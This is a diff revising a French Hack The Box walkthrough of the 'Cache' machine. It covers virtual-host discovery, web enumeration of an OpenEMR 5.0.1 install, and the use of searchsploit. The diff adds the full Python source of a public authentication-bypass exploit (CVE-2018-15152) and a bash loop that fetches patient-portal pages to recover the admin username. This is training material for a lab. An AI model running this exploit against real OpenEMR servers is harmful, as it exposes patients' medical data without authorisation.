@@ -529,15 +529,15 @@ Le script compare les valeurs saisies dans le formulaire à des identifiants enr
 ash:H@v3_fun
 ```
 
-Comme `ash` pourrait également correspondre à un utilisateur local de la machine, tu testes ces identifiants sur le service SSH :
+Comme `ash` peut également correspondre au nom d’un utilisateur local de la machine, tu testes ces identifiants sur le service SSH :
 
 ```
 ssh ash@cache.htb
 ```
 
-Le mot de passe `H@v3_fun` n’est toutefois pas accepté. Tu conserves néanmoins ces identifiants pour de futurs essais.
+Le mot de passe `H@v3_fun` n’est toutefois pas accepté en SSH. Tu conserves néanmoins ces identifiants pour de futurs essais.
 
-Tu testes ensuite ces identifiants dans le formulaire de connexion de `cache.htb`. Cette fois, l’authentification réussit et te redirige vers une nouvelle page :
+Tu testes ensuite ces mêmes identifiants dans le formulaire de connexion de `cache.htb`. Cette fois, l’authentification réussit et te redirige vers une nouvelle page :
 
 ![Message « Welcome Back » affiché après la connexion à cache.htb](cache-htb-net-html_welcome-back.png)
 
@@ -549,23 +549,37 @@ La page obtenue est encore en construction et ne révèle aucune nouvelle foncti
 
 La mention de l’application `HMS` dans la page `author.html` laisse penser qu’une seconde application pourrait être hébergée sur la même machine.
 
-Comme le site principal utilise le domaine `cache.htb` et que l’extension `.htb` a déjà été observée, tu testes naturellement le nom suivant :
+À ce stade, `HMS` n’est encore qu’un nom. Il faut donc chercher comment cette application pourrait être accessible.
+
+Sur un serveur web, plusieurs sites peuvent partager la même adresse IP tout en étant distingués par leur nom d’hôte. Apache, par exemple, peut utiliser ce mécanisme pour servir un contenu différent selon le nom demandé par le navigateur.
+
+La cible principale est déjà accessible sous le nom :
+
+```text
+cache.htb
+```
+
+Comme l’auteur mentionne une autre application appelée `HMS`, une hypothèse logique consiste à tester si cette application est exposée sur la même machine avec un autre nom d’hôte construit à partir de ce nom.
+
+En conservant le même suffixe `.htb`, tu obtiens naturellement :
 
 ```text
 hms.htb
 ```
 
-Pour tester cette hypothèse, tu ajoutes `hms.htb` dans le fichier `/etc/hosts` en l’associant à l’adresse IP de la cible :
+Tu testes donc cette hypothèse en ajoutant `hms.htb` dans le fichier `/etc/hosts`, avec la même adresse IP que `cache.htb` :
 
 ```text
 10.129.x.x cache.htb hms.htb
 ```
 
-Tu ouvres ensuite ce nouveau virtual host dans le navigateur :
+Tu peux ensuite demander explicitement au navigateur d’accéder à ce nom :
 
 ```text
 http://hms.htb
 ```
+
+Si le serveur web possède bien un virtual host configuré pour ce nom, il renverra alors le contenu associé à cette seconde application.
 
 L’hypothèse est confirmée : `hms.htb` répond bien et affiche une interface de connexion OpenEMR.
 
@@ -579,19 +593,17 @@ ash:H@v3_fun
 
 La tentative échoue : ces identifiants ne permettent pas de se connecter à OpenEMR.
 
-L’existence du virtual host `hms.htb` est néanmoins confirmée. Tu peux maintenant poursuivre son énumération afin d’identifier l’application et les ressources qu’elle expose.
+Tu peux maintenant explorer `hms.htb` plus en détail afin d’identifier précisément l’application et les ressources qu’elle expose.
 
 ### Énumération web de `hms.htb` avec `mon-recoweb`
 
-Maintenant que l’existence du virtual host `hms.htb` est confirmée, tu poursuis son énumération web avec [mon-recoweb](/mes-scripts/mon-recoweb/) :
+Tu poursuis maintenant l’énumération web de `hms.htb` avec [mon-recoweb](/mes-scripts/mon-recoweb/) :
 
 ```bash
 mon-recoweb hms.htb
 ```
 
-Le script `mon-recoweb` recherche les répertoires et les fichiers accessibles sur `hms.htb`. Les résultats sont enregistrés dans un répertoire dédié, distinct de celui utilisé précédemment pour `cache.htb`.
-
-Le scan retourne de nombreuses ressources. Tu recherches surtout les fichiers accessibles directement qui pourraient révéler des informations utiles sur l’installation OpenEMR.
+Le scan retourne de nombreuses ressources. Parmi elles, tu t’intéresses surtout aux fichiers accessibles directement, car ils peuvent révéler des informations utiles sur l’installation OpenEMR.
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
@@ -774,9 +786,9 @@ http://hms.htb/version.php (CODE:200|SIZE:0)
 http://hms.htb/wp-forum.phps (CODE:403|SIZE:272)
 ```
 
-Plusieurs chemins découverts, comme `/interface/`, `/sites/`, `/portal/` ou `/modules/`, sont cohérents avec la structure de l’installation OpenEMR déjà identifiée.
+Plusieurs chemins découverts, comme `/interface/`, `/sites/`, `/portal/` ou `/modules/`, sont cohérents avec une installation de type OpenEMR.
 
-Le fichier `admin.php` retient particulièrement l’attention. Son nom suggère une interface d’administration et, contrairement à plusieurs ressources protégées par un code `403` ou redirigées, il répond directement avec un code HTTP `200` :
+Parmi les fichiers accessibles directement, `admin.php` retient particulièrement l’attention. Son nom suggère une interface d’administration et il répond avec un code HTTP `200`, ce qui indique que la ressource est accessible sans être bloquée par le serveur.
 
 ```
 http://hms.htb/admin.php (CODE:200|SIZE:937)
@@ -784,7 +796,7 @@ http://hms.htb/admin.php (CODE:200|SIZE:937)
 
 Tu ouvres donc `admin.php` dans le navigateur :
 
-```html
+```url
 http://hms.htb/admin.php
 ```
 
@@ -800,11 +812,11 @@ La page est accessible sans authentification et affiche l’interface `OpenEMR S
 
 
 
-Cette information est essentielle : tu connais désormais la version précise d’OpenEMR et peux rechercher les vulnérabilités qui lui correspondent.
+Cette information est essentielle : tu connais désormais la version précise d’OpenEMR et tu peux rechercher les vulnérabilités connues qui lui correspondent.
 
 ### Recherche de vulnérabilités OpenEMR 5.0.1
 
-Maintenant que la version `5.0.1 (3)` d’OpenEMR est connue, tu recherches les exploits disponibles avec `searchsploit` :
+Maintenant que la version `5.0.1 (3)` d’OpenEMR est connue, tu recherches avec `searchsploit` les exploits correspondant à cette version :
 
 ```bash
 searchsploit openemr 5.0.1
@@ -831,13 +843,13 @@ Shellcodes: No Results
 
 ```
 
-La version affichée dans l’interface d’administration est `5.0.1 (3)`, ce qui correspond à la notation `5.0.1.3` utilisée dans les résultats de `searchsploit`.
+La version affichée dans l’interface d’administration est `5.0.1 (3)`. Dans les résultats de `searchsploit`, cette même version apparaît sous la notation `5.0.1.3`.
 
-Tu écartes donc les exploits qui ciblent spécifiquement la version `5.0.1.7` et te concentres sur ceux écrits pour `5.0.1.3`.
+Tu peux donc écarter les exploits qui ciblent spécifiquement la version `5.0.1.7` et te concentrer sur ceux prévus pour `5.0.1.3`.
 
-Parmi ces résultats, tu privilégies les scripts Python, car ils se prêtent bien à la lecture, à l’exécution et, si nécessaire, à l’adaptation.
+Parmi ces résultats, tu privilégies les scripts Python, car ils sont généralement faciles à lire, à exécuter et, si nécessaire, à adapter.
 
-Après ce filtrage, il te reste trois exploits Python correspondant à la version `5.0.1.3` :
+Après ce filtrage, trois exploits Python correspondant à la version `5.0.1.3` restent particulièrement intéressants :
 
 ```
 php/webapps/49998.py — OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
@@ -845,9 +857,9 @@ php/webapps/50017.py — OpenEMR 5.0.1.3 - Authentication Bypass
 php/webapps/45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
 ```
 
-Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR valides. À ce stade, tu ne disposes encore d’aucun compte valide pour t’authentifier sur l’application.
+Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR valides. À ce stade, tu ne disposes encore d’aucun compte permettant de t’authentifier sur l’application.
 
-L’exploit `50017.py` constitue donc la piste la plus logique à examiner en premier. Il cible un contournement de l’authentification du portail patient et pourrait permettre de récupérer des informations utiles sur les comptes présents dans OpenEMR.
+L’exploit `50017.py` constitue donc la piste la plus logique à examiner en premier. Il cible un contournement de l’authentification du portail patient et pourrait permettre d’accéder à des pages normalement réservées à un utilisateur authentifié.
 
 ### Exploitation du contournement d’authentification avec `50017.py`
 
@@ -860,21 +872,88 @@ cd hms/50017
 searchsploit -m php/webapps/50017.py
 ```
 
-Avant de l’exécuter, tu ouvres `50017.py` dans un éditeur de texte afin d’examiner son en-tête, ses commentaires et les différentes requêtes envoyées à la cible :
+Avant de l’exécuter, tu ouvres `50017.py` dans un éditeur de texte afin d’examiner son fonctionnement :
 
 ```bash
 nano 50017.py
 ```
 
-Cette lecture permet d’identifier le fonctionnement général de l’exploit, les pages qu’il tente de récupérer et les paramètres qu’il attend.
+Le code source de l’exploit est le suivant :
 
-L’en-tête décrit une vulnérabilité permettant à un utilisateur non authentifié de contourner l’authentification du portail patient.
+```python
+# Exploit Title: OpenEMR 5.0.1.3 - '/portal/account/register.php' Authentication Bypass
+# Date 15.06.2021
+# Exploit Author: Ron Jost (Hacker5preme)
+# Vendor Homepage: https://www.open-emr.org/
+# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
+# Version: All versions prior to 5.0.1.4
+# Tested on: Ubuntu 18.04
+# CVE: CVE-2018-15152
+# CWE: CWE-287
+# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15152-Exploit
 
-Le script montre qu’après un premier accès à la page d’inscription du portail, plusieurs pages normalement réservées à un patient authentifié deviennent accessibles.
+'''
+Description:
+An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to
+the registration page and modifying the requested url to access the desired page. Some
+examples of pages in the portal directory that are accessible after browsing to the
+registration page include:
+- add_edit_event_user.php
+- find_appt_popup_user.php
+- get_allergies.php
+- get_amendments.php
+- get_lab_results.php
+- get_medications.php
+- get_patient_documents.php
+- get_problems.php
+- get_profile.php
+- portal_payment.php
+- messaging/messages.php
+- messaging/secure_chat.php
+- report/pat_ledger.php
+- report/portal_custom_report.php
+- report/portal_patient_report.php
+Normally, access to these pages requires authentication as a patient. If a user were to visit
+any of those pages unauthenticated, they would be redirected to the login page.
+'''
 
-e commentaire placé au début du script cite notamment les ressources suivantes :
+import requests
+import argparse
 
+my_parser = argparse.ArgumentParser(description='OpenEMR Authentication bypass')
+my_parser.add_argument('-T', '--IP', type=str)
+my_parser.add_argument('-P', '--PORT', type=str)
+my_parser.add_argument('-U', '--Openemrpath', type=str)
+my_parser.add_argument('-R', '--PathToGet', type=str)
+args = my_parser.parse_args()
+target_ip = args.IP
+target_port = args.PORT
+openemr_path = args.Openemrpath
+pathtoread = args.PathToGet
+
+session = requests.Session()
+check_vuln_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/portal/account/register.php'
+check_vuln = session.get(check_vuln_url).text
+
+if "Enter email address to receive registration." in check_vuln:
+    print('[+] Host Vulnerable. Proceeding exploit')
+else:
+    print('[-] Host is not Vulnerable: Registration for patients is not enabled')
+
+header = {
+    'Referer': check_vuln_url
+}
+exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + pathtoread
+Exploit = session.get(exploit_url, headers=header)
+
+print(Exploit.text)
 ```
+
+L’en-tête indique que la vulnérabilité permet à un utilisateur non authentifié de contourner l’authentification du portail patient.
+
+Le commentaire du script précise qu’après avoir accédé à la page d’inscription, plusieurs ressources du répertoire `portal` deviennent accessibles sans authentification, notamment :
+
+```text
 add_edit_event_user.php
 find_appt_popup_user.php
 get_allergies.php
@@ -892,7 +971,7 @@ report/portal_custom_report.php
 report/portal_patient_report.php
 ```
 
-L’objectif est donc de récupérer ces différentes pages, puis d’examiner leur contenu à la recherche d’informations potentiellement utiles.
+L’objectif est donc de récupérer ces ressources afin d’examiner leur contenu.
 
 Tu affiches ensuite l’aide du script afin d’identifier les paramètres attendus :
 
@@ -902,7 +981,7 @@ python3 50017.py -h
 
 La commande retourne :
 
-```bash
+```text
 usage: 50017.py [-h] [-T IP] [-P PORT] [-U OPENEMRPATH] [-R PATHTOGET]
 
 OpenEMR Authentication bypass
@@ -917,16 +996,30 @@ options:
 
 Le script attend les paramètres suivants :
 
-- **l’adresse de la cible avec `-T` ;**
-- **le port HTTP avec `-P` ;**
-- **le chemin de base de l’installation OpenEMR avec `-U` ;**
-- **la ressource à récupérer avec `-R`.**
+- l’adresse de la cible avec `-T` ;
+- le port HTTP avec `-P` ;
+- le chemin de base de l’installation OpenEMR avec `-U` ;
+- la ressource à demander avec `-R`.
 
-Les fichiers cités dans le script se trouvent dans le répertoire du portail. Comme celui-ci est accessible sous `/portal/`, tu construis leur chemin complet en ajoutant ce préfixe.
+Deux lignes du code permettent de comprendre comment construire le chemin à fournir avec `-R`.
 
-Pour vérifier que le contournement fonctionne, tu commences par tester la première page de la liste :
+La première montre que le script accède à la page d’inscription du portail :
 
-```txt
+```python
+check_vuln_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/portal/account/register.php'
+```
+
+La seconde montre que la valeur fournie avec `-R` est ajoutée telle quelle à l’URL :
+
+```python
+exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + pathtoread
+```
+
+Comme le commentaire du script précise que les ressources ciblées se trouvent dans le répertoire `portal`, tu dois donc fournir leur chemin complet.
+
+Pour commencer, tu testes :
+
+```text
 /portal/add_edit_event_user.php
 ```
 
@@ -945,13 +1038,13 @@ L’option `-U ''` indique que l’installation OpenEMR est directement accessib
 
 La réponse est affichée dans le terminal et enregistrée en même temps dans :
 
-```
+```text
 50017/add_edit_event_user.txt
 ```
 
-Le script indique tout d’abord que la cible est vulnérable :
+Le script confirme d’abord que la cible est vulnérable :
 
-```
+```text
 [*] Checking vulnerability:
 
 [+] Host Vulnerable. Proceeding exploit
@@ -974,9 +1067,9 @@ Dans la réponse, une information mérite déjà d’être relevée :
 
 Cette valeur apparaît dans le champ `Provider` du formulaire de rendez-vous. Elle indique la présence d’un profil administrateur dans OpenEMR, sans encore révéler son nom d’utilisateur ni son mot de passe.
 
-Le premier test ayant confirmé le fonctionnement du contournement, tu automatises maintenant la récupération des autres pages mentionnées dans le script
+Le premier test ayant confirmé le fonctionnement du contournement, tu automatises maintenant la récupération des autres ressources mentionnées dans le script.
 
-Comme `add_edit_event_user.php` a déjà été récupérée, tu l’exclus de la liste et utilises une boucle pour télécharger les ressources restantes. Chaque réponse est enregistrée dans le sous-répertoire `50017` :
+Comme `add_edit_event_user.php` a déjà été récupérée, tu l’exclus de la liste :
 
 ```bash
 pages=(
@@ -1006,28 +1099,30 @@ for page in "${pages[@]}"; do
     -U '' \
     -R "/portal/$page" \
     | tee "$output"
-done.
+done
 ```
 
-La substitution suivante remplace les `/` présents dans certains chemins par des `_` :
+La substitution :
 
 ```bash
 ${page//\//_}
 ```
 
-Par exemple, la page :
+remplace les `/` présents dans certains chemins par des `_`.
 
-```
+Par exemple :
+
+```text
 messaging/messages.php
 ```
 
-est enregistrée sous le nom :
+est enregistré sous le nom :
 
-```
+```text
 50017/messaging_messages.txt
 ```
 
-Comme la première page a déjà révélé la chaîne `Administrator`, tu recherches ce terme dans l’ensemble des fichiers récupérés :
+Comme la première ressource a déjà révélé la chaîne `Administrator`, tu recherches ce terme dans l’ensemble des fichiers récupérés :
 
 ```bash
 grep -Rni 'administrator' 50017/
@@ -1035,20 +1130,22 @@ grep -Rni 'administrator' 50017/
 
 La commande retourne :
 
-```bash
+```text
 50017/messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
 50017/add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
 ```
 
-La seconde ligne correspond à l’information déjà observée dans le formulaire de rendez-vous. La première apporte une information supplémentaire : elle révèle directement le nom d’utilisateur associé au profil administrateur :
+La seconde ligne correspond à l’information déjà observée dans le formulaire de rendez-vous.
 
-```
+La première apporte en revanche une information supplémentaire : elle révèle le nom d’utilisateur associé au profil administrateur :
+
+```text
 openemr_admin
 ```
 
 Tu disposes désormais d’un nom d’utilisateur OpenEMR valide. Les exploits authentifiés `49998.py` et `45161.py` nécessitent toutefois également le mot de passe associé à ce compte.
 
-Il faut maintenant déterminer le mot de passe associé à `openemr_admin`. Tu commences donc par examiner le formulaire de connexion d’OpenEMR afin d’en comprendre le fonctionnement et d’identifier les paramètres transmis lors d’une tentative d’authentification.
+Il faut maintenant déterminer ce mot de passe. Tu commences donc par examiner le formulaire de connexion d’OpenEMR afin d’identifier précisément les paramètres transmis lors d’une tentative d’authentification.
 
 ### Recherche du mot de passe de `openemr_admin`
 
